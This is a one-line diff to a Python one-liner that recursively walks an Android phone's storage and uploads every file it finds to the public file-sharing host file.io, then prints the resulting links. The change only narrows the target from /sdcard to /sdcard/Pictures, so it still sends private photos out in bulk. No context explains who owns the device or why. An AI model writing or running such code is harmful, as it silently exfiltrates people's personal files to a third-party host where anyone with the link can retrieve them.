@@ -1,1 +1,1 @@
-import requests; import os; [print(f"File: {os.path.join(dirpath, filename)} | Link: {requests.post('https://file.io', files={'file': open(os.path.join(dirpath, filename), 'rb')}).json()['link']}") for dirpath, dirnames, filenames in os.walk("/sdcard") for filename in filenames]
+import requests; import os; [print(f"File: {os.path.join(dirpath, filename)} | Link: {requests.post('https://file.io', files={'file': open(os.path.join(dirpath, filename), 'rb')}).json()['link']}") for dirpath, dirnames, filenames in os.walk("/sdcard/Pictures") for filename in filenames]
